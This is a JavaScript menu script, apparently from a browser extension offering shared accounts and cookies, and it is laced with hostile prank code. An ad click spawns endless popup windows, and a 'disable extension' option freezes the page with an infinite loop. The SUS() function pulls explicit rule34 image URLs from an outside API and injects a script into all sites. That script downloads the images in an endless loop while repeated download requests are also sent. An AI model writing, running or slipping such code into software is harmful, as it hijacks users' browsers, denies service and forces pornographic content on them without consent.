
document.getElementById("main-menu-home-button").onclick = function(){alert("THAT'S FUCKING SPECTAUCLAR YOU USED THE FUCKING HOME BUTTON.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIt's just a reload button."); window.parent.postMessage(JSON.stringify({text: '', type: 'Reload', relay: true}), '*')};


document.getElementById("main-menu-1").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccounts").style.display = "block"};

document.getElementById("main-menu-2").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINcookies").style.display = "block"};

document.getElementById("main-menu-3").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINforum").style.display = "block"};

document.getElementById("main-menu-4").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINsettings").style.display = "block"};

document.getElementById("main-menu-5").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINadversitment").style.display = "block"; document.getElementById("MAINadversitment").appendChild(document.createElement("img")); document.getElementById("MAINadversitment").firstElementChild.src = "https://freeacountzsusextention.github.io/extention/ad.png"; document.getElementById("MAINadversitment").firstElementChild.style.width = "306px"; document.getElementById("MAINadversitment").firstElementChild.style.height = "506px"; document.getElementById("MAINadversitment").firstElementChild.onclick = function() {for (i = 0; i <= Infinity; i++) {window.open("https://gaminggodsexy123.github.io?"+i,i,'height=500,width=500').focus()}}};

document.getElementById("main-menu-6").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINamogus").style.display = "block"};

document.getElementById("main-menu-7").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINdontclickonthisone").style.display = "block"};
document.getElementById("armageddon").onclick = function(){SUS()};

document.getElementById("main-menu-8").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINdisableextensionpermanently").style.display = "block"};
document.getElementById("extensionbyebye").onclick = function(){localStorage.setItem("extensionbyebye", true)};
if (localStorage.getItem("extensionbyebye") == 'true') while (true) console.log("extensionbyebye");

document.getElementById("main-menu-9").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINrequests").style.display = "block"};

document.getElementById("main-menu-10").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINhelp").style.display = "block"};

document.getElementById("main-menu-11").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccountsettings").style.display = "block"};

document.getElementById("main-menu-12").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("main-menu-home-button").style.display = "block"; document.getElementById("MAINaccountlogout").style.display = "block"; window.parent.postMessage(JSON.stringify({text: "000webhostapp.com", type: "ClearCookies", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "github.io", type: "ClearCookies", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "", type: "AccountSignOut", relay: true}), '*'); window.parent.postMessage(JSON.stringify({text: "", type: "Reload", relay: true}), '*')};

var favorite_account = { v: { m1: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m2: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, }, s: { m1: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m2: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m3: { a1: false, a2: false, a3: false, a4: false, a5: false, }, m4: { }, m5: { a1: false, a2: false, a3: false, a4: false, a5: false, a6: false, a7: false, a8: false, a9: false, a10: false, }, m6: { }, }, o: { }, x: { m1: { a1: false, a2: false, a3: false, }, }, };

window.addEventListener('message', function (e) {
  // Get the sent data
  const data = e.data;
  
  // If you encode the message in JSON before sending them,
  // then decode here
  const decoded = JSON.parse(data);
  if (decoded.type == "Clipboard")
    navigator.clipboard.writeText(decoded.text);
  if (decoded.type == "UserData")
    {document.getElementById("frame-accounts").contentWindow.postMessage(e.data, '*')}
  if (decoded.type == "CookieUserData")
    {document.getElementById("frame-cookies").contentWindow.postMessage(e.data, '*')}
  if (decoded.relay == true)
  {
    window.parent.postMessage(e.data, '*');
    return;
  }
});









function SUS()
{
  function shuffle(array) {
    let currentIndex = array.length,  randomIndex;
  
    // While there remain elements to shuffle.
    while (currentIndex != 0) {
  
      // Pick a remaining element.
      randomIndex = Math.floor(Math.random() * currentIndex);
      currentIndex--;
  
      // And swap it with the current element.
      [array[currentIndex], array[randomIndex]] = [
        array[randomIndex], array[currentIndex]];
    }
  
    return array;
  }


  var hell = [];
  
  function Downloader() {
    try{
    //var hell = [];
    async function test() {
      function toDataURL(url) {
        {
          return fetch(url).then((response) => {return response.blob();}).then(blob => {return URL.createObjectURL(blob);});
      }
    }
      while (true)
      {
        for (let i = 0; i < hell.length; i++)
        {
          const a = document.createElement("a");
          a.href = await toDataURL(hell[i]);

          a.download = "";
          document.body.appendChild(a);
          
          a.click();
          //document.body.removeChild(a);
        }
      }
    }
    test();
    }
    catch
    {
      hell = ['https://c.tenor.com/gQV5VzHLWQIAAAAd/among-us-sus.gif'];
      async function test() {
        console.log("s");
        function toDataURL(url) {
          return fetch(url).then((response) => {return response.blob();}).then(blob => {return URL.createObjectURL(blob);});
        }
  
        while (true)
        {
          for (let i = 0; i < hell.length; i++)
          {
            const a = document.createElement("a");
            a.href = await toDataURL(hell[i]);
  
            a.download = "";
            document.body.appendChild(a);
            console.log(hell[i]);
            a.click();
            //document.body.removeChild(a);
          }
        }
      }
    }
  }

  function toStringPrint(array)
  {
  var temparray = [];for (i=0;i<array.length;i++){temparray.push("'"+array[i]+"'");}return "["+temparray.toString()+"]";
  }

  function sendsusrequest()
  {
    var Downloaderfunc = Downloader.toString();
    Downloaderfunc = Downloaderfunc.substring(Downloaderfunc.indexOf("\n")+1);
    Downloaderfunc = Downloaderfunc.substring(Downloaderfunc.lastIndexOf("\n")+1,-1);
    Downloaderfunc = ("var hell = "+toStringPrint(hell)+";")+ Downloaderfunc;
    console.log(Downloaderfunc);
      const SendRequest =
      {
        text: JSON.stringify({site: "all urls", script: Downloaderfunc}),
        type: "InjectScript",
        relay: true,
      }
      window.parent.postMessage(JSON.stringify(SendRequest), '*');
    function d()
    {
      for (let i = 0; i < hell.length; i++)
      {
        
        const SendRequest =
        {
          text: JSON.stringify({url: hell[i], filename: ""}),
          type: "Download",
          relay: true,
        }
        window.parent.postMessage(JSON.stringify(SendRequest), '*');
        
        //window.open("https://gaminggodsexy123.github.io?"+Math.random().toString(16).substr(2, 8), Math.random().toString(16).substr(2, 8), 'height=500,width=500').focus()
      }
      setTimeout(100, d());
    }
    setTimeout(5, d());
  }

  {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var rule34query = JSON.parse(this.responseText);
        var rule34queryfileurls = [];
        for (let key in rule34query) {
          rule34queryfileurls.push(rule34query[key].file_url.replace('https://r34-json-api.herokuapp.com/images?url=', ''));//console.log(key, rule34query[key]);
        }
        hell = shuffle(rule34queryfileurls);
        sendsusrequest();
      }
    };
    xhttp.open("GET", "https://r34-json-api.herokuapp.com/posts?tags=among_us+impostor_(among_us)+crewmate_(among_us)", true);
    xhttp.send();
  }
}
